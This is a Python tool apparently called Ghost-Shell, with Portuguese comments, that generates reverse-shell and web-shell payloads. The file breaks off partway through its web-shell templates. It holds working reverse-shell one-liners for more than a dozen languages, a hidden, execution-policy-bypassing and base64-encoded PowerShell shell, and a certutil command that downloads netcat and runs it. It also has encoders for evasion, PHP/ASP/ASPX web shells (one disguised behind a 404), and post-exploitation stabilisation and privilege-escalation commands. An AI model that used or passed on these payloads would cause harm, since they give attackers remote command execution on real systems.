#!/usr/bin/env python3
"""
Ghost-Shell v1.0.0 - Gerador de Reverse Shells e Web Shells
============================================================
Ferramenta interativa para geracao de payloads de reverse shell e web shells
em multiplas linguagens e formatos. Suporta codificacao (Base64, URL, Hex),
geracao de web shells one-liner e instrucoes de estabilizacao de shell.

Modos:
  gen      Gerar payload de reverse shell
  webshell Gerar web shell (PHP, ASP, ASPX, JSP, NodeJS)
  encode   Codificar payload existente
  list     Listar todas as linguagens/tipos disponiveis

Exemplos:
  python ghost-shell.py gen -l bash -i 10.0.0.1 -p 4444
  python ghost-shell.py gen -l python3 -i 10.0.0.1 -p 9001
  python ghost-shell.py gen -l powershell -i 10.0.0.1 -p 4444 --encode base64
  python ghost-shell.py gen -l all -i 10.0.0.1 -p 4444
  python ghost-shell.py gen -l php -i 10.0.0.1 -p 4444 --encode url
  python ghost-shell.py webshell --tipo php
  python ghost-shell.py webshell --tipo php --senha ghost
  python ghost-shell.py webshell --todos
  python ghost-shell.py encode --payload "bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'" --tipo base64
  python ghost-shell.py list
  python ghost-shell.py gen -l bash -i 10.0.0.1 -p 4444 --listener

Dependencias: apenas Python 3 stdlib (nenhuma instalacao necessaria)

Autor: By Gh0st-Bx1 | github.com/Ghost-Bx1
"""

import argparse
import base64
import subprocess
import sys
import os
from datetime import datetime

try:
    import colorama
    colorama.init(autoreset=False)
except ImportError:
    pass

VERSAO = "2.2.0"


def _build_banner():
    import re as _re
    G = "\033[92m"; Cy = "\033[96m"; D = "\033[2m"; N = "\033[1m"
    W = "\033[97m"; X = "\033[0m"
    IW = 68; eq = "\u2550" * IW; sp = " " * IW
    TL = "\u2554"; TR = "\u2557"; BL = "\u255a"; BR = "\u255d"; VB = "\u2551"
    hl = "\u2500" * 44; bar = "\u2502"
    vl = lambda s: len(_re.sub(r"\x1b\[[0-9;]*m", "", s))

    def _row(s):
        n = vl(s); p = max(0, IW - n); l = p // 2; r = p - l
        return f"{G}{VB}{X}{' ' * l}{s}{' ' * r}{G}{VB}{X}"

    def _row_l(s):
        n = vl(s); p = max(0, IW - n - 2)
        return f"{G}{VB}{X}  {s}{' ' * p}{G}{VB}{X}"

    # Ghost art (braille pixel art)
    ga = [
        ("", f"{G}⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⠛⠛⠿⠟⠉⠛⠻⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿{X}", ""),
        ("", f"{G}⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠉⢀⣠⣤⣶⣶⣶⣶⣶⣶⣤⣀⠢⢝⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿{X}", ""),
        ("", f"{G}⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⡡⢀⣴⡿⢋⡴⢿⣿⣿⣿⣿⣿⣿⣿⢷⣦⡑⠈⡛⠿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿{X}", ""),
        ("", f"{G}⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⡜⢠⣾⣿⣤⣋⣴⣿⣿⣿⣿⣿⣿⣿⣿⣷⣌⠻⣶⣦⣤⣤⣀⠉⠻⣿⣿⣿⡿⠿⢛⢛⡻⠿⣿⣿⣿⣿{X}", ""),
        ("", f"{G}⣿⠿⠟⠟⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⢀⣿⣿⣿⡿⠛⠛⠻⣿⣿⣿⡿⠛⠛⢿⣿⣿⣧⠉⠉⣁⣈⣉⣁⢀⣿⣿⢋⠄⣁⣴⣶⣄⠐⢌⢻⣿⣿{X}", ""),
        ("", f"{G}⡏⠀⣴⣦⣄⠢⡙⢿⣿⣿⣿⣿⣿⣿⡇⠀⣼⣿⣿⣿⠅⠀⠀  ⢹⣿⡿⠁⠀⠀⠀⢹⣿⣿⡆⠀⣿⣿⣿⣿⣿⡟⠁⢀⣴⣿⣿⣿⣿⣷⡈⠎⢿⣿{X}", ""),
        ("", f"{G}⡇⠀⣿⣿⣿⣷⣌⠀⠙⢿⣿⣿⣿⣿⠀⢀⣿⣿⣿⣿⠀⠀⠀  ⠀⠈⣿⡇⠀⠀⠀⠀⠈⢿⣿⡇⠁⢻⣿⣿⣿⡿⠁⢠⣾⣿⣿⣿⡿⢿⣿⣷⠀⠘⣿{X}", ""),
        ("", f"{G}⣇⠀⢿⣿⣿⡟⣿⣷⣄⠀⠙⢿⣿⡇⠀⣸⣿⣿⡿⣿⡀⠀⠀⠀  ⢸⣿⣧⠀⠀⠀⠀⣸⡈⣿⣷⠀⡈⣿⣿⡿⠁⢀⣾⣿⣿⢩⣿⠁⣾⣿⣿⡆⠀⢿{X}", ""),
        ("", f"{G}⣿⡀⠘⣿⣿⣿⡘⣿⣿⣷⣌⠂⠉⠁⢠⣿⣿⡟⣰⢿⣷⣤⣤⣴⣿⣿⣿⣷⣄⣠⣴⣿⣧⠸⣿⣧⡐⠢⠉⠁⢀⣾⣿⣿⡇⣼⣿⢸⣿⣿⣿⣇⠀⢸{X}", ""),
        ("", f"{G}⣿⣷⡀⠸⣿⣿⣧⠸⣿⣿⣿⣿⣶⣶⣿⣿⠏⡰⢃⣾⣿⣿⣿⣿⡏⠀⠈⣿⣿⣿⣿⣿⣏⠳⣘⣿⣿⣷⣶⣾⣿⣿⣿⣿⢠⣿⣿⣿⣿⣿⣿⣿⠀⢸{X}", ""),
        ("", f"{G}⣿⣿⡇⠀⣿⣿⣿⡄⡿⢿⣿⣿⣿⣿⣿⣷⣾⣷⣿⣿⣿⣿⣿⣿⣧⣀⣠⣿⣿⣿⣿⣿⣿⣷⣾⣿⣿⣿⣿⣿⣿⣿⣿⡇⠸⠋⢉⠉⡉⠛⠿⣿⠀⢸{X}", ""),
        ("", f"{G}⣿⣿⡇⢀⣿⣿⣿⣧⢸⡘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁⢠⣾⣿⡄⠈⠀⠀⠀⠀ ⣾{X}", ""),
        ("", f"{G}⣿⡟⠀⣸⣿⣿⣿⣿⣜⡇⢿⣧⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⡉⠻⠇⠀⠰⠀⠀ ⣀⣾{X}", ""),
        ("", f"{G}⣿⠃⢠⣿⣿⠿⠿⠿⢿⣿⠸⣿⣀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢻⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⢣⢸⣿⣿⣿{X}", ""),
        ("", f"{G}⣿⢰⠜⠋⠀⢀⡄⢰⣤⡀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠃⢻⣿⣿{X}", ""),
        ("", f"{G}⣿⣆⠠⠀⡀⠀⠁⣿⣿⠟⠀⣽⣿⣿⣿⣿⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢻⣿⣿⣿⣿⣿⢃⣿⣿⣿⡟⣸⣿⣿⣿⣿⡿⠋⢠⢃⣾⣿⣿{X}", ""),
        ("", f"{G}⣿⣿⣷⣶⠆⡄⠈⢉⣠⣴⣾⣿⢿⣿⣿⣿⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⢋⣴⣿⣿⣿⣿⣿⣿⢸⣿⣿⣿⠇⠛⢏⠉⠉⠁⠤⢊⣥⣾⣿⣿⣿{X}", ""),
        ("", f"{G}⣿⣿⣿⣿⢄⠀⢾⣿⣿⣿⣿⡇⢸⣿⣿⣿⢸⣿⣿⣿⣿⣿⣿⣿⣶⣬⣭⣶⣾⣿⣿⠏⣼⣿⣿⣿⡇⣸⣿⣿⣿⠀⣰⣿⡁⢠⣿⣿⣿⣿⣿⣿⣿⣿{X}", ""),
        ("", f"{G}⣿⣿⣿⣿⣤⣀⡀⠀⠀⠉⠉⠁⢸⣿⣿⣿⢸⣿⣿⣿⣿⡹⣿⣿⣿⣿⣿⣿⣿⣿⠋⣼⣿⣿⣿⣿⠇⣿⣿⣿⣿⡀⠹⢿⡇⠀⢿⣿⣿⣿⣿⣿⣿⣿{X}", ""),
        ("", f"{G}⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠛⠀⣼⣿⣿⣿⢸⣿⣿⢻⣿⣷⣌⠻⣿⣿⣿⣿⠟⣡⣾⣿⡟⣼⣿⣿⠀⣿⣿⣿⣿⣿⣶⣤⡀⠀⢸⣿⣿⣿⣿⣿⣿⣿{X}", ""),
        ("", f"{G}⣿⣿⣿⣿⣿⣿⣿⣿⠈⠀⣴⣾⣿⣿⣿⡇⢸⣿⣿⣇⢻⣿⣿⣷⣦⣭⣭⣴⣾⣿⣿⣿⢡⣿⣿⣿⠀⣿⣿⣿⣿⣿⠿⠟⠃⡀⢸⣿⣿⣿⣿⣿⣿⣿{X}", ""),
        ("", f"{G}⣿⣿⣿⣿⣿⣿⣿⣿⡐⠠⢈⡉⠛⠛⠿⡇⢸⣿⣿⣿⡜⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⣼⣿⣿⣿⠀⣁⣤⡄⠀⣀⣒⣀⣤⣶⣿⣿⣿⣿⣿⣿⣿⣿{X}", ""),
        ("", f"{G}⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣦⡌⠀⣦⠀⣼⣿⣿⣿⣇⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⢁⣿⣿⣿⣿⣄⡈⠛⠃⠐⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿{X}", ""),
        ("", f"{G}⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁⠀⢁⣤⣿⣿⣿⣿⣿⠘⣿⣿⣿⣿⣿⣿⣿⣿⡟⢸⣿⣿⣿⣿⣿⣿⣦⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿{X}", ""),
        ("", f"{G}⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀⠠⣿⣿⣿⣿⣿⣿⣿⠀⣿⣿⣿⣿⣿⣿⣿⣿⡇⢼⠿⠿⣿⣿⣿⣿⠟⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿{X}", ""),
        ("", f"{G}⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣄⠀⠈⣙⠛⠛⣛⣛⠛⠀⠻⢿⣿⣿⣿⣿⣿⣿⡃⢠⣤⠀⠀⣀⣉⣁⣀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿{X}", ""),
        ("", f"{G}⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣶⣶⣶⣶⣶⣤⡀⢀⠈⢿⣿⣿⣿⣿⣷⣄⠁⠀⣹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿{X}", ""),
        ("", f"{G}⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⠁⠈⣿⣿⣿⣿⣿⣿⡆⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿{X}", ""),
        ("", f"{G}⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠠⢠⣿⣿⣿⣿⣿⠟⢀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿{X}", ""),
        ("", f"{G}⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡗⠀⢸⣿⣿⣿⡿⢁⡄⣡⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿{X}", ""),
        ("", f"{G}⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠰⠘⣿⣿⣿⠁⠎⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿{X}", ""),
        ("", f"{G}⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡑⠈⠻⠇⠈⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿{X}", ""),
        ("", f"{G}⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣤⣀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿{X}", ""),
    ]

    info = [
        f"{G}{N}GHOST-SHELL{X}",
        f"{Cy}v{VERSAO}  {D}Payload Generator & Shell Listener{X}",
        f"{D}{hl}{X}",
        f"{W}By Gh0st-Bx1  {D}{bar}  github.com/Ghost-Bx1{X}",
        f"{D}{hl}{X}",
        f"{D}gen  webshell  encode  list  macro  amsi{X}",
        f"{D}xor  obfuscate  c2  listen  shellcode  staged{X}",
        f"{D}etw  lolbas  hollow  c2docker{X}",
        f"{D}bash  ps1  php  perl  ruby  go  java  awk{X}",
    ]

    out = [f"{G}{TL}{eq}{TR}{X}", f"{G}{VB}{sp}{VB}{X}"]
    for left, center, right in ga:
        combined = left + center + right
        out.append(_row(combined))
    out.append(f"{G}{VB}{sp}{VB}{X}")
    for i in info:
        out.append(_row_l(i))
    out += [f"{G}{VB}{sp}{VB}{X}", f"{G}{BL}{eq}{BR}{X}"]
    return "\n".join(out)


BANNER = _build_banner()

C = {
    "R": "\033[91m", "G": "\033[92m", "Y": "\033[93m",
    "B": "\033[94m", "M": "\033[95m", "C": "\033[96m",
    "W": "\033[97m", "X": "\033[0m",  "N": "\033[1m", "D": "\033[2m",
}


def _log(msg, nivel="INFO"):
    niveis = {
        "INFO":   (C["B"], "[*]"),
        "OK":     (C["G"], "[+]"),
        "ERRO":   (C["R"], "[-]"),
        "ALERTA": (C["Y"], "[!]"),
        "PAYLOAD":(C["M"] + C["N"], "[>]"),
        "TITULO": (C["C"] + C["N"], "[=]"),
    }
    cor, simbolo = niveis.get(nivel, (C["W"], "[*]"))
    print(f"  {cor}{simbolo} {msg}{C['X']}")


def _caixa(titulo, conteudo, cor=None):
    cor = cor or C["C"]
    largura = max(len(linha) for linha in conteudo.split("\n")) + 4
    largura = max(largura, len(titulo) + 4, 60)
    linha = "-" * largura
    print(f"\n{cor}  +{linha}+")
    print(f"  | {titulo:<{largura - 2}} |")
    print(f"  +{linha}+{C['X']}")
    for l in conteudo.strip().split("\n"):
        print(f"  {C['W']}{l}{C['X']}")
    print()


# ==============================================================================
# PAYLOADS DE REVERSE SHELL
# ==============================================================================

def _gerar_payloads(ip, porta):
    """Retorna dicionario com todos os payloads de reverse shell."""
    porta = str(porta)

    payloads = {
        "bash": {
            "descricao": "Bash TCP",
            "payload": f"bash -i >& /dev/tcp/{ip}/{porta} 0>&1",
            "wrapper": f"bash -c 'bash -i >& /dev/tcp/{ip}/{porta} 0>&1'",
            "so": "Linux",
        },
        "bash_196": {
            "descricao": "Bash /dev/tcp com file descriptor 196",
            "payload": f"0<&196;exec 196<>/dev/tcp/{ip}/{porta}; sh <&196 >&196 2>&196",
            "so": "Linux",
        },
        "bash_udp": {
            "descricao": "Bash UDP",
            "payload": f"bash -i >& /dev/udp/{ip}/{porta} 0>&1",
            "so": "Linux",
        },
        "sh": {
            "descricao": "sh via netcat",
            "payload": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {ip} {porta} >/tmp/f",
            "so": "Linux",
        },
        "nc": {
            "descricao": "Netcat tradicional",
            "payload": f"nc -e /bin/sh {ip} {porta}",
            "so": "Linux/BSD",
        },
        "nc_openbsd": {
            "descricao": "Netcat OpenBSD (sem -e)",
            "payload": f"rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc {ip} {porta} > /tmp/f",
            "so": "Linux",
        },
        "nc_windows": {
            "descricao": "Netcat Windows",
            "payload": f"nc.exe -e cmd.exe {ip} {porta}",
            "so": "Windows",
        },
        "python2": {
            "descricao": "Python 2",
            "payload": (
                f"python -c 'import socket,subprocess,os;"
                f"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
                f"s.connect((\"{ip}\",{porta}));os.dup2(s.fileno(),0);"
                f"os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
                f"p=subprocess.call([\"/bin/sh\",\"-i\"])'"
            ),
            "so": "Linux",
        },
        "python3": {
            "descricao": "Python 3",
            "payload": (
                f"python3 -c 'import socket,subprocess,os;"
                f"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
                f"s.connect((\"{ip}\",{porta}));os.dup2(s.fileno(),0);"
                f"os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
                f"subprocess.call([\"/bin/sh\",\"-i\"])'"
            ),
            "so": "Linux",
        },
        "php": {
            "descricao": "PHP exec",
            "payload": f"php -r '$sock=fsockopen(\"{ip}\",{porta});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
            "so": "Linux",
        },
        "php_shell": {
            "descricao": "PHP shell_exec",
            "payload": f"php -r '$sock=fsockopen(\"{ip}\",{porta});shell_exec(\"/bin/bash -i <&3 >&3 2>&3\");'",
            "so": "Linux",
        },
        "perl": {
            "descricao": "Perl",
            "payload": (
                f"perl -e 'use Socket;$i=\"{ip}\";$p={porta};"
                f"socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
                f"if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");"
                f"open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'"
            ),
            "so": "Linux",
        },
        "ruby": {
            "descricao": "Ruby",
            "payload": (
                f"ruby -rsocket -e'f=TCPSocket.open(\"{ip}\",{porta}).to_i;"
                f"exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
            ),
            "so": "Linux",
        },
        "golang": {
            "descricao": "Go (requer compilacao)",
            "payload": (
                f"package main\nimport (\"net\";\"os\";\"os/exec\")\n"
                f"func main() {{\n"
                f"  conn, _ := net.Dial(\"tcp\", \"{ip}:{porta}\")\n"
                f"  cmd := exec.Command(\"/bin/sh\")\n"
                f"  cmd.Stdin, cmd.Stdout, cmd.Stderr = conn, conn, conn\n"
                f"  cmd.Run()\n}}"
            ),
            "so": "Linux",
        },
        "java": {
            "descricao": "Java Runtime.exec",
            "payload": (
                f"r = Runtime.getRuntime()\n"
                f"p = r.exec([\"/bin/bash\",\"-c\","
                f"\"exec 5<>/dev/tcp/{ip}/{porta};cat <&5 | while read line; do $line 2>&5 >&5; done\"] as String[])\n"
                f"p.waitFor()"
            ),
            "so": "Linux",
        },
        "groovy": {
            "descricao": "Groovy (Jenkins RCE)",
            "payload": (
                f"String host=\"{ip}\";\n"
                f"int port={porta};\n"
                f"String cmd=\"/bin/sh\";\n"
                f"Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();\n"
                f"Socket s=new Socket(host,port);\n"
                f"InputStream pi=p.getInputStream(),pe=p.getErrorStream(),"
                f"si=s.getInputStream();\n"
                f"OutputStream po=p.getOutputStream(),so=s.getOutputStream();\n"
                f"while(!s.isClosed()){{while(pi.available()>0)so.write(pi.read());"
                f"while(pe.available()>0)so.write(pe.read());"
                f"while(si.available()>0)po.write(si.read());"
                f"so.flush();po.flush();}}"
            ),
            "so": "Linux",
        },
        "nodejs": {
            "descricao": "Node.js",
            "payload": (
                f"(function(){{var net=require(\"net\"),cp=require(\"child_process\"),"
                f"sh=cp.spawn(\"/bin/sh\",[]);"
                f"var client=new net.Socket();"
                f"client.connect({porta},\"{ip}\",function(){{client.pipe(sh.stdin);"
                f"sh.stdout.pipe(client);sh.stderr.pipe(client);}});"
                f"return /a/;}})();"
            ),
            "so": "Linux",
        },
        "lua": {
            "descricao": "Lua",
            "payload": (
                f"lua -e \"require('socket');require('os');"
                f"t=socket.tcp();t:connect('{ip}','{porta}');"
                f"os.execute('/bin/sh -i <&3 >&3 2>&3');\""
            ),
            "so": "Linux",
        },
        "awk": {
            "descricao": "AWK",
            "payload": (
                f"awk 'BEGIN {{s = \"/inet/tcp/0/{ip}/{porta}\"; while(42) {{ "
                f"do{{ printf \"shell>\" |& s; s |& getline c; print c; "
                f"while ((c |& getline) > 0) print |& s; close(c); }} while(c != \"exit\") }}}}'"
            ),
            "so": "Linux",
        },
        "socat": {
            "descricao": "Socat (pty interativo)",
            "payload": f"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{ip}:{porta}",
            "so": "Linux",
            "nota": "Mais estavel que outros - suporta TAB e setas",
        },
        "socat_static": {
            "descricao": "Socat estatico (listener no atacante)",
            "payload": f"socat file:`tty`,raw,echo=0 tcp-listen:{porta}",
            "so": "Linux",
            "nota": "Execute no listener (atacante) para shell interativo completo",
        },
        "powershell": {
            "descricao": "PowerShell TCP",
            "payload": (
                f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command "
                f"New-Object System.Net.Sockets.TCPClient(\"{ip}\",{porta});"
                f"$stream = $client.GetStream();"
                f"[byte[]]$bytes = 0..65535|%{{0}};"
                f"while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{"
                f"$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);"
                f"$sendback = (iex $data 2>&1 | Out-String );"
                f"$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";"
                f"$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
                f"$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};"
                f"$client.Close()"
            ),
            "so": "Windows",
        },
        "powershell_b64": {
            "descricao": "PowerShell Base64 (payload auto-encodado)",
            "payload": None,
            "so": "Windows",
            "nota": "Gerado automaticamente como base64",
        },
        "cmd_certutil": {
            "descricao": "CMD + CertUtil download e exec",
            "payload": (
                f"certutil.exe -urlcache -split -f http://{ip}:{porta}/nc.exe %TEMP%\\nc.exe "
                f"& %TEMP%\\nc.exe -e cmd.exe {ip} {porta}"
            ),
            "so": "Windows",
        },
        "msfvenom_hint": {
            "descricao": "msfvenom (referencia)",
            "payload": (
                f"msfvenom -p windows/x64/shell_reverse_tcp LHOST={ip} LPORT={porta} "
                f"-f exe -o shell.exe\n"
                f"msfvenom -p linux/x64/shell_reverse_tcp LHOST={ip} LPORT={porta} "
                f"-f elf -o shell.elf\n"
                f"msfvenom -p php/reverse_php LHOST={ip} LPORT={porta} -f raw -o shell.php"
            ),
            "so": "Ambos",
        },
    }

    # Gerar powershell base64
    ps_raw = (
        f"$client = New-Object System.Net.Sockets.TCPClient('{ip}',{porta});"
        f"$stream = $client.GetStream();"
        f"[byte[]]$bytes = 0..65535|%{{0}};"
        f"while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{"
        f"$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);"
        f"$sendback = (iex $data 2>&1 | Out-String);"
        f"$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';"
        f"$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
        f"$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};"
        f"$client.Close()"
    )
    ps_b64 = base64.b64encode(ps_raw.encode("utf-16-le")).decode()
    payloads["powershell_b64"]["payload"] = f"powershell -e {ps_b64}"

    return payloads


def _codificar(payload, tipo):
    """Codifica um payload no formato especificado."""
    if tipo == "base64":
        return base64.b64encode(payload.encode()).decode()
    if tipo == "base64_utf16":
        return base64.b64encode(payload.encode("utf-16-le")).decode()
    if tipo == "url":
        import urllib.parse
        return urllib.parse.quote(payload)
    if tipo == "double_url":
        import urllib.parse
        return urllib.parse.quote(urllib.parse.quote(payload))
    if tipo == "hex":
        return payload.encode().hex()
    return payload


def _imprimir_payload(nome, info, ip, porta, encode=None):
    """Imprime payload formatado."""
    payload = info.get("payload", "")
    if not payload:
        return

    if encode:
        payload_codificado = _codificar(payload, encode)
    else:
        payload_codificado = payload

    descricao = info.get("descricao", nome)
    so = info.get("so", "")
    nota = info.get("nota", "")

    print(f"\n{C['C']}{C['N']}  [{nome.upper()}] {descricao} ({so}){C['X']}")
    if nota:
        print(f"  {C['Y']}Nota: {nota}{C['X']}")
    if encode:
        print(f"  {C['D']}(encodado: {encode}){C['X']}")
    print(f"\n  {C['G']}{payload_codificado}{C['X']}\n")


def _instrucoes_estabilizacao():
    """Imprime instrucoes de estabilizacao de shell."""
    print(f"\n{C['C']}{C['N']}  ==========================================")
    print(f"  ESTABILIZACAO DE SHELL (Post-Exploitation)")
    print(f"  =========================================={C['X']}")

    instrucoes = [
        ("1. Python PTY (mais comum)", [
            "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'",
            "# ou python -c 'import pty;pty.spawn(\"/bin/bash\")'",
            "# Ctrl+Z para suspendir",
            "stty raw -echo; fg",
            "export TERM=xterm",
            "export SHELL=bash",
            "stty rows 40 columns 160",
        ]),
        ("2. Socat (shell totalmente interativo)", [
            "# Na maquina atacante (iniciar listener):",
            f"socat file:`tty`,raw,echo=0 tcp-listen:PORT",
            "# Na maquina vitima:",
            "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:IP:PORT",
        ]),
        ("3. Script /dev/tty", [
            "script /dev/null -c bash",
            "# Ctrl+Z",
            "stty raw -echo; fg",
            "reset",
            "export TERM=xterm",
        ]),
        ("4. rlwrap (semi-interativo melhorado)", [
            "# Na maquina atacante, antes do nc:",
            "rlwrap nc -lvnp PORT",
        ]),
        ("5. Verificar SUID para escalada", [
            "find / -perm -4000 -type f 2>/dev/null",
            "find / -perm -2000 -type f 2>/dev/null",
            "sudo -l",
        ]),
    ]

    for titulo, cmds in instrucoes:
        print(f"\n  {C['Y']}{titulo}{C['X']}")
        for cmd in cmds:
            cor = C["D"] if cmd.startswith("#") else C["G"]
            print(f"    {cor}{cmd}{C['X']}")


# ==============================================================================
# WEB SHELLS
# ==============================================================================

WEB_SHELLS = {
    "php_cmd": {
        "extensao": ".php",
        "descricao": "PHP - cmd via GET parametro cmd",
        "template": "<?php system($_GET['cmd']); ?>",
        "uso": "?cmd=id",
    },
    "php_passthru": {
        "extensao": ".php",
        "descricao": "PHP - passthru",
        "template": "<?php passthru($_GET['cmd']); ?>",
        "uso": "?cmd=id",
    },
    "php_shell_exec": {
        "extensao": ".php",
        "descricao": "PHP - shell_exec com output",
        "template": "<?php echo shell_exec($_GET['cmd']); ?>",
        "uso": "?cmd=id",
    },
    "php_senha": {
        "extensao": ".php",
        "descricao": "PHP - com autenticacao por senha",
        "template": """<?php
if(md5($_GET['pass']) == '{md5}') {{
    echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';
}} else {{
    http_response_code(404);
}}
?>""",
        "uso": "?pass=SENHA&cmd=id",
    },
    "php_upload": {
        "extensao": ".php",
        "descricao": "PHP - upload de arquivo + exec",
        "template": """<?php
if(isset($_FILES['f'])) {{
    move_uploaded_file($_FILES['f']['tmp_name'], $_FILES['f']['name']);
    echo 'OK: '.$_FILES['f']['name'];
}} else {{
    echo shell_exec($_GET['cmd']??'id');
}}
?>""",
        "uso": "?cmd=id ou POST com file upload",
    },
    "asp_classic": {
        "extensao": ".asp",
        "descricao": "ASP Classic - exec via WScript.Shell",
        "template": """<%
Set oS = Server.CreateObject("WSCRIPT.SHELL")
Call oS.Run("cmd.exe /c " & Request.Form("cmd"),0,True)
%>
<form method="POST">
<input type="text" name="cmd" value="whoami">
<input type="submit" value="Run">
</form>""",
        "uso": "POST cmd=whoami",
    },
    "aspx": {
        "extensao": ".aspx",
        "descricao": "ASPX - Process.Start",
        "template": """<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
protected void Page_Load(object sender, EventArgs e) {
    string cmd = Request.QueryString["cmd"];
    if (!string.IsNullOrEmpty(cmd)) {
        ProcessStartInfo psi = new ProcessStartInfo("cmd.exe", "/c " + cmd);
        psi.RedirectStandardOutput = true;
        psi.UseShellExecute = false;
        Process p = Process.Start(psi);
        Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>");
    }
}
</script>""",
        "uso": "?cmd=whoami",
    },
    "jsp": {
        "extensao": ".jsp",
        "descricao": "JSP - Runtime.exec",
